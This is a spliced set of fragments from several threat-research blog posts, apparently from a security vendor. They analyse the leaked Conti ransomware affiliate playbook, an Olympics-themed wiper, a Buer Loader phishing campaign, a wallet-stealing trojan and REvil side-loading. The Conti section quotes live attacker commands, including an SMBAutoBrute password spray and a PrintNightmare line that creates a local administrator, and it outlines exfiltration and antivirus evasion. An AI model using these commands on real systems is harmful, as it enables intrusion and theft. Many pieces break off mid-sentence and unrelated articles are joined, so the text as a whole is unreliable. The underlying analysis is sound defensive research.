+:\/:
+The document also defines the ultimate goal as getting the admin password via further brute forcing.
+:\/:
+The manual provides a simple overview of Mimikatz and useful command lines for the extraction of clear passwords from memory, Kerberos tickets, etc. It also highlights examples of combined MimiKatz/Cobalt Strike usage. 
+:\/:
+Other instructions include guidance on pass-the-hash/NTLM, reading lsass, procdump, and other post exploitation techniques. It is also interesting to see, in screenshot below, a discussion on exploiting the Zerologon (CVE-2020-1472) vulnerability, which suggests how recent this document is.
+:\/:
+The manual also provides guidance of using the open source tool SMBAutoBrute. According to the Github page for this tool, it allows pentesters to perform smart brute forcing of accounts against the current domain, ensuring that lockouts do not occur. On a side note, researchers at Sentinel One highlighted the usage of SMBAutoBrute within Cobalt Strike in their June 2020 analysis of Trickbot and Ryuk threat actors.
+:\/:
+Along with instructions, the authors provide additional guidance, as shown in figure 4, which has been machine-translated from the Russian:
+:\/:
+If these passwords less than we can run in a brute force attack - supplement safely them from the following list of the most private occurring in the corporate environment.
+:\/:
+ It is also recommended to use a list of passwords based on the times of the year and the current year. Given that passwords are changed once in three months - you can take a "reserve" for the generation of the sheet.
+:\/:
+Inside a TrickBot Cobalt Strike Attack Serverhttps://labs.sentinelone.com/inside-a-trickbot-cobaltstrike-attack-server/
+:\/:
+All passwords above fall either into 3 out of 4 requirements for Active Directory passwords (which is enough for users to set them ), or into all 4 requirements.
+:\/:
+
+ The example below highlights the successful discovery of Admin and CiscoDirSvcs accounts using 1qazXDR% as the password. Note that this is a common password because, if you look at your keyboard, it makes a V pattern:
+:\/:
+psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR% +" -LockoutThreshold 5
+:\/:
+
+The example above highlights the gang’s efforts to provide useful insight to their affiliates based on what we assume is from their own experiences as they appear to have pentesters on their staff or, at least, individuals knowledgeable of pentesting techniques.
+:\/:
+The example below highlights the domain controller information for a successful construction company who may have likely already been a victim of the gang. The document further explains to the reader to look for the parameter of:
+:\/:
+Setting the lockout threshold to “Never” means that the account will not be locked after a set number of failed attempts occurs:
+:\/:
+The references to CVE-2020-1472 (privilege escalation in Netlogon)—also known as Zerologon and #PrintNIghtMare, and referenced as CVE-2021-1675 & CVE-2021-34527—reveals to us how recent this document is. It shows that it was either recently created or updated. For reference, CVE-2020-1472 allows an unauthenticated attacker with network access to compromise a domain controller’s Active Directory identity services.
+:\/:
+The excerpt below highlights the exploitation of these two recent vulnerabilities, related to July’s 2021 Microsoft Windows Print Spooler vulnerabilities. Essentially, these vulnerabilities allow a normal user account to fully take over and control a client or server machine running an affected print spooler service. Although similar in scope, 1675 is local while 34527 is remotely exploitable. The excerpt below highlights the use of a PowerShell script obtained from Github that is loaded into Cobalt Strike. The Github URL is also provided by the threat actors:
+:\/:
+The vulnerability is fresh, but already sensational. We use it until we shut it down) CVE -2021-34527 Allows you to create a local administrator, useful if an agent arrived with the rights of a simple user
+:\/:
+powershell Invoke-Nightmare -NewUser "HACKER" -NewPassword "FUCKER" -DriverName "Xeroxxx" // create user HACKER with passord FUCKER, add to localadmins
+:\/:
+ spawnas COMPNAME \ HACKER FUCKER https // instead of https the listener name The agent arrives from under our new local administrator There is also a chance to get the agent from under SYSTEM * , we do the following after import:
+:\/:
+Contained within the document are references to EternalBlue (which covers CVEs CVE-2017-143 to 148). EternalBlue was the Windows SMB server exploit that was initially a Microsoft Windows zero day stockpiled by the NSA. This zero day was ultimately disclosed as part of the ShadowBrokers breach of the NSA in 2017. This disclosure by the Shadow Brokers (a clandestine group unofficially linked to Russia) led to the notorious WannaCry, Petya, and NotPetya attacks that leveraged and exploited this vulnerability. 
+:\/:
+Note that this section appears to have been written a long time ago, well before the Conti gang surfaced, as there are references to Windows OS that have not been patched, even though they were patched and addressed by Microsoft in May of 2017. This likely indicates that this section might be either a copy and paste job lifted from another source, or perhaps repurposed by the gang from a document created under a previous guise and simply not updated:
+:\/:
+Windows 7 , 8 , 10 , 2008 , 2012 , 2016 - can be not patched and correspondingly vulnerable. During the time the attack on them, to increase chances on a successful operation specify login and password user domain.
+:\/:
+The above excerpt highlights the usage of Mimikatz within a Cobalt Strike beacon to dump hashed domain controller passwords via NTDS.dlt (which contains the AD datafile and passwords). Once this is performed, the reader is instructed to install Anydesk on all abandoned hosts, and Atera on the rest, as seen below:
+:\/:
+The flag ­–start-with-win is to start AnyDesk with Windows, which is necessary for remote restart, etc. 
+:\/:
+The guide also provides affiliates with suggestions for using Netscan, which makes finding backup directories and network attached storage devices (NAS) easier. This is done to improve the chances of payment, as well as locating more data to exfiltrate
+:\/:
+The manual also suggests that the reader view disks by size, as that is where the “juice” is hidden. Also documented is RouterScan, another open source pentesting tool that allows someone to find devices located on a network, such as a router, web camera, NAS, and any other device that has a web interface that can be brute forced.
+:\/:
+To house and store exfiltrated data, the document suggests creating a MEGA.io account. Before this account is created, it also suggests paying in cryptocurrency and choosing the 2 TB plan:
+:\/:
+Once the MEGA account has been created, it suggests that the affiliate begin looking for items of interest, including bank statements for 2021, account reports, various security documents (assuming red/blue team information), and whether the organization has a cybersecurity insurance policy! Again, according to the authors, anything “juicy.” Affiliates who have exfiltrated this data must be sure to prepare the “datapack” right away, back up to MEGA, and the list all the documents (perhaps as a proof of exfiltration). Automated mass exfiltration is made even easier using the tool RClone. 
+:\/:
+Exfiltrating the data has several advantages, such as providing proof of knowledge of what is going on within the victim’s organization and then using that information as leverage in different types of negotiations.
+:\/:
+We go to the mega from the torus . and search by keywords. need accounting reports. bank statements. for 20-21 years. all fresh .
+:\/:
+The excerpt below highlights the beginning of the ransom lock process stage. In this example, we see that the Conti threat actors use a batch file to deploy a file across the domain. The document also provides instructions for Linux, as well as various flags to look for to locate known and unknown drives, how to disable VMware services, including ESXi, deleting shadow copies, and then engaging in mass lock, which likely means encrypting all identified computers on a network.
+:\/:
+There are also some instructions that highlight paths for Linux/Unix versions, as well as versions possibly targeting VMWare, though we have not observed any in the wild (coincidentally, it has been reported that REvil has a Linux variant that targets VMWare’s ESXi
+:\/:
+). Could this be a new or future feature? It also suggests that if the SSH connection to a targeted machine fails, it will continue the encryption process anyway. Usually, when a SSH connection fails within a Linux/Unix environment, a HUP (hangup) signal is sent to terminate the script, but the authors have thought everything through to make sure this doesn’t happen.
+:\/:
+     When using this parameter, the locker will encrypt files in the specified path. A required parameter will not lock anything without it.
+:\/:
+Linux Variant of REvil Ransomware Targets VMware’s ESXi, NAS Devices https://threatpost.com/linux-variant-ransomware-vmwares-nas/167511/
+:\/:
+     Specifies a file with a list of virtual machines that should not be shut down. One line for each VM.
+:\/:
+There is also a section dedicated to defeating built-in AV tools, such as Windows Defender. Tips to defeat another well-known antivirus company are also offered. This is deployed via batch files and scheduled tasks.
+:\/:
+Notes on operational guidance for remaining anonymous are also provided by the Conti Group. They highlight the importance of remaining anonymous, but also discuss that is not imperative to hide, since by disabling known services and technologies the attacker is even more likely to be detected. They even advise not utilizing well-known Linux pentesting operating systems, and suggest either using generic ones or build their own.
+:\/:
+1. Задача не скрыться (всё равно не получится), а слиться с толпой. Так что отключив webrtc, Javascript, Flash и т.д. будите только больше внимания к себе привлекать. Нужно НЕ ОТКЛЮЧАТЬ, а ПОДМЕНЯТЬ то что позволяет вас обнаружить.
+:\/:
+2. По поводу Kali и других ОС для хакеров. Вот есть группа людей (Хаккеров), которую нужно отследить. Технически эту задачу решить тяжело. Проще сыграть на человеческой слабости (лень) и собрать всех в кучу предоставив правильно разрекламированное, удобное, готовое и популярное решение. Думаю мысь понятна. Cоветую использовать Debian или собрать что-то свое.
+:\/:
+Although the instructions provided in the manual are well documented, some portions of the content appear to be rehashed or likely repurposed from elsewhere, reminiscent of the 2000’s play of the classic 70’s Anarchist Cookbook, The Anarchy Cookbook from Jolly Roger. However, this doesn't mean that the document is poorly written. It is actually quite novel to see the time and effort taken by threat actors engaged in illegal activity to properly document some of their tradecraft, regardless of refinement or plagiarism, thereby allowing others who are less skilled or less experienced to have a fundamental understanding of how to get started. 
+:\/:
+Of course, it makes a lot of sense for a ransomware gang to make it easier for their affiliates to use their ransomware, as this is a business and there are competitors out there. Any outfit run like a business will pay attention to things like market share and usage frequency, and will therefore make an effort to increase the likelihood of affiliate adoption to increase market share and profitability.
+:\/:
+ detects and blocks Conti ransomware attacks out of the box without any prior knowledge or special configuration beforehand. This can be seen in the images below, where the TTPs of the attackers are detected pre-execution.
+:\/:
+As it has been observed that many Conti affiliates use AnyDesk, Atera, Splashtop, Remote Utilities, and Screen Connect to initialize and maintain persistent network access, it is recommended that organizations block all remote access connections from these programs by utilizing application controls if there is no business justification for their use.
+:\/:
+Due to the ease of disruption and damage to daily operations and the reputation of an organization, as well as the unwanted release of personally identifiable information (PII), etc., it is important to keep all AV and IPS signatures up to date.
+:\/:
+It is also important to ensure that all known vendor vulnerabilities are addressed and updated to prevent attackers from gaining a foothold within a network. Attackers are well-aware of the difficulty of patching, and they exploit that reality. Therefore, if it is determined that patching anywhere in the network is not currently feasible, an assessment should be conducted to determine risk and alternative protections, such as hot patching, should take place.
+:\/:
+And finally, organizations are encouraged to conduct ongoing training sessions to educate and inform personnel about the latest phishing/spear phishing attacks. They need to be able to identify attacks, know to never open attachments from someone they don't know, and to always treat emails from unrecognized/untrusted senders with caution. Since many ransomware attacks are also delivered via social engineering, it is crucial that end users be made aware of the various types of attacks being used against them through regular training sessions and impromptu tests using predetermined templates by an organizations' internal security department. Simple user awareness training on how to spot emails with malicious attachments or links could also help prevent initial access into the network.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+As society becomes increasingly reliant on technology, and as the world is more connected than ever, attacks by threat actors are not only more prevalent but also more disruptive. Because of the variety of agendas held by different malicious entities including—cybercriminals, hacktivists, nation states, etc.—attacks and disruptions targeted at high profile events are easy targets for sowing chaos, distributing malware, capturing or exfiltrating data, or even shutting down an event altogether. But regardless of the purpose, mass disruption and fear almost always occurs whether that was the intended goal of the attackers or not.
+:\/:
+ has observed new threat samples targeting the 2021 Tokyo Olympic games. It includes a wiper component, which, if successful, could cause a disruption to targeted machines.
+:\/:
+The most recent attack targeting the Olympics was documented during the 2018 Winter Games. The lure was a malicious Word document titled, "
+:\/:
+ Once the user opened the document, the sample called and dropped a backdoor component, called Icefog. First discovered in 2013, the Icefog backdoor was used to attack sectors in the APAC region, with a focus on Japan and South Korea.
+:\/:
+The threat actor group responsible for Icefog is very methodical. Targets are carefully chosen, and the group seems to know what they are after beforehand. Icefog leveraged CVE-2012-0158—a older vulnerability in Windows common controls—relying on the fact that many system administrators, especially those in organizations with a large number of computers (governments, NGOs, companies, various organizations, etc.), often find patching cumbersome. Because of this, older exploits such as this are often a successfully exploited vector, even though this particular vulnerability was over 6 years old at the time of the attack.
+:\/:
+Fast forward to today, and in the wee hours of the Tokyo Olympic Games an interesting Wiper malware surfaced that reminded us of the same destructive malware that targeted the Pyeongchang Winter Games. This one is called “Olympic Destroyer.” Its file name is “【至急】東京オリンピック開催に伴うサイバー攻撃等発生に関する被害報告について.exe” (English translation: “(Urgent) Damage report in relation with cyber attacks targeting the Tokyo Olympics Games.exe”.
+:\/:
+Although this particular malware is listed in some OSINT reports as potentially related to the Olympic Destroyer sample, we have not observed this to be the case. We also do not have any information on the delivery mechanism or methods used by the attacker, nor its intended targets. However, given its ties to the Olympics, and the relative short time frame for exploitation, we feel it is important that we share what we know so far about this new wiper malware.
+:\/:
+: This is an evolving situation, and we will update this blog with relevant information when available. 
+:\/:
+For a historical summary of attacks targeting the Olympic Games, please visit the Cyber Threat Alliance whitepaper, for which FortiGuard Labs was a contributing author:
+:\/:
+, 2021. A related file was subsequently found to have been uploaded to the same repository on July 17
+:\/:
+’s advanced real-time protection and have already been added to our cloud intelligence to prevent further execution on customer systems. 
+:\/:
+The destroyer malware searches for and deletes files with the following file extensions in the compromised machine.
+:\/:
+The malware also silently accesses a benign adult site. Lastly, the threat deletes itself when all actions are completed.
+:\/:
+At this time, there is insufficient evidence to support the involvement of any nation state. Based on the relative lack of sophistication of the code, however, it seems unlikely that a nation state is behind the malware. 
+:\/:
+The malware has one interesting trick up its sleeve to deter researchers—it checks to see whether its own code has been modified. For example, the non-wiper (July 17
+:\/:
+Essentially, what this means is that for certain functions, such as Enum_Procs, Check_Debuggers, and Check_VMX (seen in the above screenshot), the malware checks the first 5 bytes to see if it contains the “0xCC” opcode. This x86 assembly instruction stands for INT3, which tells debuggers to temporarily stop a running program. This method works as another anti-debug check because it detects to see if this function has been disabled.
+:\/:
+) version of this malware goes a step further. Aside from checking for “0xCC”, it also checks for others such as “0xEB” (call), “0xE8” (jmp), and “0xE9” (jmp). These instructions divert program flow away from the intended flow created by the original programmer. One reason to divert program flow is to hook and monitor Windows APIs. An API monitor can report what a program is doing while it is running, saving researchers a lot of reverse engineering time and effort. However, if any of this code has been modified to enable monitoring, the wiper exits without performing any malicious activities. This is yet another anti-analysis check to avoid behavioral monitoring. More information about diverting program flow can be found on the Microsoft 
+:\/:
+As this is an ongoing event, FortiGuard Labs is monitoring the situation and will provide relevant updates for significant findings as they are uncovered.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+FortiGuard Labs has discovered a malicious spam campaign that uses the names of two well-known corporate entities as a social engineering lure to trick a target into opening a maliciously crafted Microsoft Excel document. When opened, the document contacts a remote server that downloads a malicious payload from a predefined website. What makes this campaign different from similar malicious spam campaigns is the use of a signed Microsoft Excel file with an .XLL file extension, rather than the standard .XLS file extension. 
+:\/:
+In this blog, we will examine details of this attack as well as the infrastructure they used. The reader will see the multi-step process used to ensure that the target would be infected, including evasive steps to bypass detection technologies via the .XLL file extension and the use of a valid signed digital certificate.
+:\/:
+An XLL file extension is used by Excel Add-in files to allow third party applications to add extra functionality to Excel. XLL files are similar in structure to DLL files. They allow for calls of specific Excel commands, worksheet functions from Visual Basic (VBA), registered XLL commands, and 
+:\/:
+ functions referenced in Excel. The use of XLL files is not as common as a maliciously crafted XLS file that contain macros or exploits, so it is a rarely observed evasion tactic used by threat actors to bypass endpoint detection.
+:\/:
+Complicating things even further, the malicious XLL file used in this campaign (at the time of analysis) is signed with a valid digital signature and chained accordingly. Signed 
+:\/:
+ containing valid digital certificates are used by threat actors to evade detection as they are trusted by antivirus and other endpoint security software. Because a company or organization is vetted by a certificate authority (CA) before the issuance of a digital certificate, operating systems and anti-virus software treat files signed with these certificates as clean, which ultimately allows the signed file to operate with impunity. 
+:\/:
+And finally, when run, the maliciously crafted Excel file connects to a predetermined server to download the payload, which in this case is Buer Loader.
+:\/:
+The modus operandi of these attackers is spam email. Based on our observations, these attacks do not appear to be targeted, but instead appear to be blanketed campaigns looking for low hanging fruit—i.e., anyone willing to open the malicious attachment.  
+:\/:
+The email in the example below is a variant of the classic shipment courier status email, with this variation using DHL and Amazon trademarks as the lure. This specific example was sent to an individual and not to an organization, further reinforcing the idea that these campaigns are not targeted.
+:\/:
+This malicious spam appears to be rushed or the product of non-native English speakers as there are grammatical issues—“We sincerely sorry due to inconvenience...”—which makes it less than convincing, even to the untrained observer. 
+:\/:
+(Incidentally, the recipient of this particular email has had their email username and password posted online previously. And according to haveibeenpwned[.]com, this email address has also been exposed in four separate breaches.)
+:\/:
+Contained within the email is an attachment with the file name “Detailed Invoice.xll.” Looking at the attachment we can see that it is digitally signed and chains appropriately. The digital signature is assigned to HORUM, with a reference email address of admin[@]khorum[.]ru:
+:\/:
+When the user opens the XLL file, the Excel file triggers on xlAutoOpen in a similar fashion to a macro. The following image shows the export name is the same.
+:\/:
+Analysis reveals that the IP address serving the executable file belongs to a webhosting reseller in Florida in the United States. Further analysis shows that this is most likely a compromised server and, based on experience, it is probably controlled by affiliates of the bad actors or the bad actors themselves. 
+:\/:
+Taking a deeper inspection of the server we see that it contains an open directory that is public. In the folder where csrsc.exe resides, a directory timestamp appears to have been changed to look like it is one of the original files from 2016. However, analysis revealed that the csrsc.exe file was actually compiled in 2021. 
+:\/:
+The directory also contains several other files from June 2021 that may be from a different campaign. We have also observed older campaigns over the past several years being downloaded from this same IP address. Some of these campaigns involve serving fake data recovery software as well as PayPal themed phishing sites. However, it is difficult to determine if these attackers are all related, or if this is simply a leased server used by multiple threat actors.
+:\/:
+A passive DNS entry of domains that resolved to this IP address highlights a variety of businesses entities, but overall, they appear to be a random collection of websites of customers belonging to the webhosting reseller.
+:\/:
+The downloaded file is Buer Loader. First discovered in 2019, Buer Loader is Malware-as-a-Service that was first used by threat actors to deliver banking Trojans and various other malware. As it gained popularity it was later adopted by Ryuk threat actors to help establish an initial foothold on targeted networks. Once this foothold was established, the infamous Ryuk ransomware was then deployed. Buer Loader has evolved since then and the following provides further insight into this latest version.
+:\/:
+Analysis of srtherhaeth.exe reveals what is likely an invalid or expired signature, and because of this it did not chain appropriately and could not be verified as a legitimate certificate.
+:\/:
+srtherhaeth.eXe is almost 2 MB. In the world of malware, files in this size range are not common. This is a newer variant of Buer loader that has been completely rewritten, as first pointed out by ProofPoint in 
+:\/:
+ of 2021. A deeper dive reveals that it was written in RUST and uses RUST crates/libraries, which explains the file size anomaly versus traditional malware.
+:\/:
+Consistent with the latest version of Buer Loader, this version was observed incorporating the whoami (
+:\/:
+) RUST crate, which allows for details such as current user info including username, full name, preferred language, OS name/version, and environment it is located in. The version used is whoami-1.1.1, which was released on 2021-03-13 (
+:\/:
+One interesting component of RUST are toolchains. In layman’s terms, RUST toolchains are collections of programs along with multiple dependencies needed to compile a RUST application.
+:\/:
+According to the official site, Ring is a safe, fast, small crypto focused on general-purpose cryptography. It uses RUST with BoringSSL's cryptography primitives.
+:\/:
+Detailed analysis over a 30-day period revealed a large majority of connections from US-based victims (66%), followed, interestingly enough, by Mozambique (22%), Singapore (5%), and other countries at (1% or less). 
+:\/:
+A cursory review of our telemetry indicates that over 1/3 of the traffic occurred over port 22 (SSH/SFTP). Almost all of these port 22 connections originate from a reportedly compromised server. Since this is a shared server hosting multiple websites, this information indicates that the provider may not mind hosting malicious websites.
+:\/:
+While the use of malicious XLL files is not new, it is rarely used. But couple that with the fact that a valid digital signature was used (at the time of the attack) and the level of sophistication and resourcefulness of these attackers increases in the minds of threat researchers. Even though the email lure used was basic, this may only indicate that the group behind this campaign was simply testing the effectiveness of their techniques. 
+:\/:
+However, the techniques used in this campaign are harder to spot than the average attack. The examples in this blog highlight a carefully thought-out campaign by the attacker, who took the needed time and steps to ensure that their work would not be detected before infection. Thankfully, Fortinet customers running the latest definition sets are already protected against this campaign. 
+:\/:
+ advanced real-time protection and have already been added to our cloud intelligence to prevent further execution on customer systems.
+:\/:
+, can also be used to proactively test the susceptibility of your organization to these kinds of phishing attacks.
+:\/:
+: NSE 1—Information Security Awareness, which has a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+ campaign that uses the classic strategy of attaching a malicious Microsoft Word document to an unsolicited email that recipients were then asked to open. However, after I performed some deep research on this phishing campaign, I realized that a fresh malware was being delivered by the Word document designed to steal crypto wallet information and credentials from the victims’ infected devices. This 
+:\/:
+ doesn’t seem to belong to any known malware family, so we named it "dmechant", which is a constant string compiled in the malware sample.
+:\/:
+In this analysis I reveal my findings on this new malware, including how it is launched by the Word document, how the executable deploys itself on the victim’s device, what kind of sensitive information it searches for, and how stolen data is sent to the attacker via SMTP protocol.
+:\/:
+The spam email looks like an urgent order reminder from a purchase manager. It asks the recipient to review the materials in the attached Word document and then reply to the email as soon as possible. 
+:\/:
+As with Word documents used in other phishing campaigns, this one includes a malicious Macro. Once opened, Word displays a security warning bar to inform the user of the risk of opening it.
+:\/:
+Interestingly, the content of this document is written in Spanish. Our best guesses are that this campaign is targeting multiple regions and the wrong document was attached, or this is being done deliberately to disguise the warning. In either case, I translated it into English using Google translate:
+:\/:
+The malicious Macro is executed once the button Enable Content is clicked. It has a VBA function called Document_Open(). This is a built-in function of the Macro and is called automatically when the document is opened. It then calls other functions to extract a JS (JavaScript) code into a file (rtbdxsdcb.js) under the %temp% folder. After that, it executes this “JS” file to finish the Macro’s work.
+:\/:
+Figure 1.3 is a screenshot of Macro VBA code displaying the JS code to be extracted and the process of writing into local file rtbdxsdcb.js, as well as it being executed.
+:\/:
+Going through the JS code we find that its code is highly obfuscated. According to my analysis, its major task is to request the URL:
+:\/:
+This downloads an executable file into %Temp% and saves it as erbxcb.exe, which is the payload file of this malware. Later, it creates a WScript.Shell object to start up the payload executable file on the infected device.
+:\/:
+The payload file, erbxcb.exe, is disguised as a PDF document to confuse the victim. Figure 2.1 shows what this file looks like.
+:\/:
+Once it starts, erbxcb.exe loads a block of compressed data from its PE file and decompresses it into a local file named %Temp%\arwtfgxjpx80. (This is an encrypted PE file that I will discuss shortly.) It continues to dynamically extract a piece of code into the Stack memory and get it executed.
+:\/:
+1. It copies erbxcb.exe into a newly-created folder (%AppData%\bplg) and renames “aoqn.exe”. As you can see in Figure 2.2, it was about to call a function (call 12F675, whose arguments are the source file and the target file) to copy this executable file into a new location.
+:\/:
+2. It adds the copied file into the auto-run group in the system registry. To do this, it calls several APIs, like RegOpenKeyExW() and RegSetValueExW(). Figure 2.3 is a screenshot of the system registry with the added auto-run item, making this malware able to run at Windows startup.
+:\/:
+3. It then loads the decompressed file %Temp%\ arwtfgxjpx80, mentioned earlier, into memory and calls a function to decrypt it. As a result, it is able to  extract an executable PE file in memory. 
+:\/:
+The dynamic code then creates a duplicate of the current process (erbxcb.exe) in a suspended state (by calling the API CreateProcessW() with a CREATE_SUSPENDED flag). In this way it is able to deploy the decrypted PE file into the newly-created second process. It then transports each section of the decrypted PE file into the second process to override its existing code. By calling the 
+:\/:
+ SetThreadContext() it is able to set the entry point of the second process to the deployed PE file, and calling ResumeThread() lets the deployed PE file run inside the second process.
+:\/:
+The last thing the dynamic code does in the first process is to call the API ExitProcess() to exit the program.
+:\/:
+According to my analysis, the decrypted PE file running inside the second process is written in MS Visual Basic 5.0-6.0 language without any packer. I dumped it into a local file, and Figure 3.1 shows the detection result in an analysis tool—Exeinfo PE.
+:\/:
+When it starts, it first gathers basic information about the victim’s device, such as current System Time, Windows Version, User Name, Computer Name, and so on. This information will be sent to the attacker along with other stolen data.
+:\/:
+It then sets %AppData%\Microsoft\Windows\Templates as its home folder, where it puts some of its temporary files, such as extracted files, collected browser profiles, and collected crypto wallet data.
+:\/:
+This malware focuses on collecting profiles of crypto wallets (if installed) from the infected device. It has ten predefined crypto wallet software instances in the malware with a dynamically combined default profile folder path, as shown at the bottom of Figure 3.2.
+:\/:
+This crypto wallet software includes: Zcash, Armory, Bytecoin, Jaxx Liberty, Exodus, Ethereum, Electrum, Atomic, Guarda, and Coinomi.
+:\/:
+Once a crypto wallet is detected, it copies the entire folder containing the wallet’s profile data (including sub-folders and files—like the path listed in Figure 3.2) to its home folder (at “%AppData%\Microsoft\Windows\Templates”). It then compresses the copied profile folders into a ZIP archive—CryptoWallets.zip—which is eventually sent to the attacker as an email’s attachment.
+:\/:
+As far as we have been able to determined, the attacker could obtain your bitcoin private key, bitcoin address, crypto wallet address and other significant information.
+:\/:
+It also extracts an EXE file (“sdedffggdg.exe”) from the Resource section, which is written by .Net Framework. This malware collects credentials from predefined browsers and saves the collected information into a newly-created credentials.txt file under its home folder.
+:\/:
+Figure 3.3 is an example of a credentials.txt file, after it executes the extracted .net EXE file(“sdedffggdg.exe”), where it shows the credentials collected from the Google Chrome browser from my testing device.
+:\/:
+“sdedffggdg.exe” is able to collect saved credentials from the following predefined browsers (if installed): "Chrome","Opera","Yandex","360 Browser","Comodo Dragon","CoolNovo","SRWare Iron","Torch Browser","Brave Browser","Iridium Browser","7Star", "Amigo","CentBrowser","Chedot","CocCoc","Elements Browser","Epic Privacy Browser","Kometa","Orbitum","Sputnik","uCozMedia","Vivaldi","Sleipnir 6", "Citrio","Coowon","Liebao Browser","QIP Surf" and "Edge Chromium".
+:\/:
+Other than the browsers identified above, this malware also collects saved credentials from other installed software clients, including Outlook, CoreFTP, FileZilla, NordVPN, FoxMail, Thunderbird, and similar browsers such as Firefox, Waterfox, K-Meleon, Cyberfox, and BlackHawk.
+:\/:
+In the memory, shown in Figure 3.4, you can see an example of the credentials just after they are collected from the application FileZilla on my research machine. Each group of credentials consists of URL, Username, Password, and Application. Each group of the credentials is split by “=============================”.
+:\/:
+This malware has a specific function used to generate and send an email that includes the stolen sensitive information using the created CDO.Message object.
+:\/:
+As you can see, it calls rtcCreateObject2() to create the CDO.Message object, which then sets the email’s From, To, Subject, TextBody, and AddAttachment fields. 
+:\/:
+Subject starts with a keyword and follows with the victim’s Computer Name and User Name. The keyword string should be one of the “CryptoWallets” for the crypto wallet profile, “Passwords” for credentials, or “Keylogger” for key logger data (this function was not enabled in this version).
+:\/:
+After an email is created, the CDO.Message’s Send() function is called to send the Email out to the attacker’s email address.
+:\/:
+Figure 4.2 sends an email with the crypto wallets profiles in the attachment CryptoWallets.zip to the attacker. The attachment is encoded in base64.
+:\/:
+Figure 4.3 shows sending stolen credentials, where the text body contains basic information, stolen credentials, and its attachment includes collected browser profiles that contain saved credentials. The attachment is also encoded in base64.
+:\/:
+ and its attached Word document. Next, I demonstrated how a JS file is extracted and executed by the Macro to download the malware’s payload executable file.
+:\/:
+I also introduced how the malware adds itself into the auto-run group and runs in the second process. I also demonstrated the main tasks of the malware, how and what kind of sensitive information it collects from the infected device, including crypto wallet profile information and the credentials of browsers and clients, and how that collected data is sent to the attacker using the SMTP protocol.
+:\/:
+I mentioned many processes in this blog. To help you better comprehend the relationship of the relevant processes initiated by the opening of the Word document, I have made a screenshot of the Process Tree, shown in Figure 5.1. The involved processes are WINWORD.EXE, cmd.exe, WScript.exe, erbxcb.exe, and sdedffggdg.exe.
+:\/:
+ users are protected by FortiGuard AntiVirus, which detects the original Word document as a malicious attachment in the phishing email, and further protected with the CDR service, which can be used to neutralize the threat of any macros within Office documents.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+. We will see what happens when a machine is infected by this ransomware by looking at some of the visible Indicators of Compromise, such as modified wallpaper, several “<random string>-readme.txt” files in different folders, and changes in the filenames with 
+:\/:
+ extensions. We will also discuss in more details how DLL side-loading was implemented along with other malware tricks that the ransomware used.
+:\/:
+ detects and blocks the DLL side-loading event when the ransomware executes the valid application, such as MsMpEng.exe, while it loads the malicious payload, mpsvc.dll. As a result, customers will not be able to see all of the related IOCs because the malware is prevented from running.
+:\/:
+One common element of most ransomware is the ransom note. Once its infection routine is completed, this ransomware variant replaces the desktop wallpaper with a dropped .bmp file notifying the victim to look for a file containing instructions, as shown in Figure 1a. 
+:\/:
+All accessible folders have a copy of the ransom note file inserted. The ransom note is dropped as a text file using a random filename, such as “5f03r-readme.txt”. The filename format uses “<random string>-readme.txt”. Encrypted files in the folder have the extension name of “5f03r” or the <random string> added to the filename.
+:\/:
+The files used for DLL side-loading technique are also dropped in the same path as the wallpaper bmp file (Figure 1d).
+:\/:
+ tricks have been developed and employed differently by various malicious actors. These include anti-debugging, anti-analysis, anti-reversing, and virtually every “anti-everything” concept that malicious authors can think of. 
+:\/:
+. The main purpose of this strategy is to avoid being detected by signature-based detection tools that looks for specific combinations of APIs used by malware. This trick also makes deeper analysis take longer because analysts are blind as to which APIs they need to be looking for.
+:\/:
+Looking deeper, these initial APIs are not very important to the malware. Instead, it resolves its needed APIs using a simple hashing computation. The malware includes a list of hash values that correspond to the APIs it needs. It first resolves the LoadLibraryA API to load the needed DLL file. It grabs the first available API name from the loaded library, calculates the hash, and then compares it to the current API hash. If it is the right hash, it gets the index of the API name and the API address pointed to by the index. If it is not the right hash, the malware gets the next API name and continues its calculations. The ransomware repeats this same process until it resolves the API addresses that the malware needs.
+:\/:
+This is quite a simple trick. Most malware hides its APIs and resolves the right addresses using different combinations of LoadLibraryA, GetProcAddress, and other APIs. They also use different combinations of encryption, calculations, and encodings. But at the end of the malware’s API addresses resolving algorithm we still get the list of APIs with their proper addresses. You can see them if you look in the right location in the malware code before it executes its infection routine.
+:\/:
+To extract the ransom note, REvil ransomware decrypts a large chunk of bytes using a simple RC4 algorithm to generate a base64 blob of string. This string is then decoded by calling the CryptStringToBinaryW API, as shown in Figure 4.
+:\/:
+The RC4 algorithm shown above is the same code that decrypts most of the strings that the malware needs, including the C&Cs used to exfiltrate information from the infected machine (Figure 5). The complete list of C&Cs can be found in Appendix B: IOCs.
+:\/:
+The MITRE ATT&CK Framework is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides threat researchers and responders with a system for examining cyberattacks, allowing techniques and events to be more easily analyzed by researchers and presented in a way that help victims to better understand where in the attack cycle certain events occur. 
+:\/:
+Critical elements of this ransomware have been mapped to the MITRE ATT&CK Framework. Two of its key strategies tied to specific MITRE ATT&CK TTP (tactics, techniques, and procedures) IDs are detailed below. The full set of MITRE ATT&CK elements are listed in the Appendix.
+:\/:
+While this ransomware has numerous tricks up its sleeves, for this article we will focus on its DLL Side-Loading trick. It uses MITRE technique T1574.002 Hijack Execution Flow: DLL Side-Loading. This technique is commonly employed by malware by dropping a malicious DLL within a search order of a valid application. This search order provides a Windows application with a list of locations where it can find a valid DLL or libraries. The application then uses the DLL that is available, whichever comes first. When the application executes it then loads the malicious DLL if it is available first rather than the valid DLL.
+:\/:
+However, this ransomware does a little more than that. Instead of just dropping the malicious “mpsvc.dll”, it also drops the valid application, MsMpEng.exe. This is a Windows Defender executable and normally not detected by security applications. After dropping both the executable and the DLL file, the ransomware executes MsMpEng.exe using CreateProcessW API.
+:\/:
